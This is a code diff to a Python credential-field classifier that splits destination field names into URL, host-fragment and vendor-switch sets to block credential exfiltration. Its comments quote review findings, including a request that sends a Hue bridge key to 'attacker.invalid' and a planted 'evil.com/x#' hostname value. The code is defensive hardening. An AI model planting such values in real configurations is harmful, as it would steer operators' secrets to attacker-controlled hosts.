@@ -49,11 +49,28 @@ class CredentialFieldGroup:
     ``_credential_value`` for this field (first vault match wins).
     ``required=False`` marks fields with a non-credential fallback (typically a
     base URL with a settings attribute or constant default).
+
+    ``proves_possession`` overrides the name heuristic in
+    ``credential_anchor_fields`` for THIS provider only. Leave it ``None``
+    (the default) unless the heuristic is measurably wrong here, because the
+    heuristic is right for the overwhelming majority and a scattering of
+    overrides is harder to reason about than one rule.
+
+    It exists because the heuristic keys on a GLOBAL name set, and a global name
+    set is right per name, not per provider. Philips Hue is the measured case: it
+    calls its bridge application key ``username``, and for a local bridge that
+    single value IS the whole credential, while ``username`` for almost every
+    other provider is a login identifier paired with a separate password. The
+    global set therefore read Hue's only secret as public metadata, the provider
+    classified as unshaped, no join was required, and an adversarial review
+    measured the operator's bridge key riding to a planted address:
+    ``GET https://attacker.invalid/api/OPERATOR-HUE-BRIDGE-KEY/lights``.
     """
 
     role: str
     names: tuple[str, ...]
     required: bool = True
+    proves_possession: Optional[bool] = None
 
 
 @dataclass(frozen=True)
@@ -240,8 +257,8 @@ def register_provider_spec(spec: ProviderCredentialSpec) -> ProviderCredentialSp
 # `tests/test_credential_destination_gate.py` walks the tools package and fails
 # when any requested primary is in neither this set nor the declared inert set,
 # so a NEW destination field name cannot default into the inert half.
-DESTINATION_PRIMARY_FIELDS: frozenset[str] = frozenset({
-    # The value is a URL.
+# The whole value is an address, so a planted one can name any host.
+DESTINATION_URL_FIELDS: frozenset[str] = frozenset({
     "accounts_base_url", "api_base_url", "api_url", "app_base_url", "base_url",
     "clearbit_autocomplete_base_url", "clearbit_company_base_url",
     "clearbit_person_base_url", "connections_url", "content_base_url", "endpoint",
@@ -249,15 +266,59 @@ DESTINATION_PRIMARY_FIELDS: frozenset[str] = frozenset({
     "jina_reader_base_url", "jina_search_base_url", "management_base_url",
     "preview_base_url", "public_base_url", "registry_url", "token_url",
     "tracking_base_url", "url", "webdav_url", "webhook_url",
-    # The value is interpolated into a hostname.
+})
+
+# The value is interpolated into a hostname, so how far a planted one reaches
+# depends on whether the site VALIDATES it. Where it does not, `/` or `#`
+# terminates the authority and the value escapes the vendor entirely: measured
+# on `support_service_integrations.py:385`, a planted `instance` of
+# "evil.com/x#" yields https://evil.com/x with the vendor suffix discarded.
+# Tracked as E10-02-E. Do not assume this half is inert.
+DESTINATION_HOST_FRAGMENT_FIELDS: frozenset[str] = frozenset({
     "app_name", "cloud_domain", "domain", "host", "instance", "region",
     "server_prefix", "shop_subdomain", "site", "subdomain",
-    # The value switches the host between hard-coded vendor constants. Real host
-    # changes, closed set. `api_version` is here because Invoice Ninja picks
-    # between app.invoiceninja.com and invoicing.co on it; its other four sites
-    # are path segments only, and the closed set is what makes that safe.
+})
+
+# The value switches the host between hard-coded vendor constants. Real host
+# changes, closed set. `api_version` is here because Invoice Ninja picks
+# between app.invoiceninja.com and invoicing.co on it; its other four sites
+# are path segments only, and the closed set is what makes that safe.
+DESTINATION_VENDOR_SWITCH_FIELDS: frozenset[str] = frozenset({
     "api_plan", "api_version", "classic_api", "environment", "sandbox",
 })
+
+DESTINATION_PRIMARY_FIELDS: frozenset[str] = (
+    DESTINATION_URL_FIELDS
+    | DESTINATION_HOST_FRAGMENT_FIELDS
+    | DESTINATION_VENDOR_SWITCH_FIELDS
+)
+
+
+def destination_url_fields_for(spec: ProviderCredentialSpec) -> frozenset[str]:
+    """This provider's WHOLE-URL destination names, all aliases.
+
+    The URL half of ``destination_fields_for``, and per spec for the same reason
+    that one is: a name is only a destination where its own spec says so.
+    ``value`` is a ``base_url`` alias for searxng and an alias of 27 secret roles
+    elsewhere; ``domain``, ``host``, ``region`` and ``server`` are similarly
+    split. A UNION of these sets across providers therefore reads 179 anchor
+    groups as address lookups, which is not a near miss: a gate that classifies a
+    secret lookup as a destination drops it from its own analysis and reports the
+    site clean. Do not add a global-union sibling to this function.
+
+    Separate from ``destination_fields_for`` because the two answer different
+    questions. That one asks "does this lookup decide where the request goes",
+    which host fragments do. This one asks "can a planted value name ANY host",
+    which today only a whole URL can, so it is the scope of the join gate in
+    ``tests/test_service_integration_egress.py``. The gap between them is
+    E10-02-E.
+    """
+    return frozenset(
+        name
+        for group in spec.groups
+        if group.names[0] in DESTINATION_URL_FIELDS
+        for name in group.names
+    )
 
 
 def destination_fields_for(spec: ProviderCredentialSpec) -> frozenset[str]:
@@ -372,13 +433,23 @@ def credential_anchor_fields(spec: ProviderCredentialSpec) -> frozenset[str]:
     must NOT gate. ``searxng`` is the only one: a bare instance URL with no
     credential anywhere in its spec.
     """
+    def _is_anchor(group: CredentialFieldGroup) -> bool:
+        # The destination veto is ABSOLUTE and is checked first, ahead of any
+        # per-spec override. A name that is an address somewhere can never be
+        # proof of possession anywhere, so an override must not be able to
+        # declare a base URL a credential; that would let a record prove
+        # possession with the very value it is trying to steer.
+        if set(group.names) & DESTINATION_PRIMARY_FIELDS:
+            return False
+        if group.proves_possession is not None:
+            return group.proves_possession
+        return (
+            group.role not in _NON_PROOF_NAMES
+            and group.names[0] not in _NON_PROOF_NAMES
+        )
+
     return frozenset(
-        name
-        for group in spec.groups
-        if group.role not in _NON_PROOF_NAMES
-        and group.names[0] not in _NON_PROOF_NAMES
-        and not (set(group.names) & DESTINATION_PRIMARY_FIELDS)
-        for name in group.names
+        name for group in spec.groups if _is_anchor(group) for name in group.names
     )
 
 
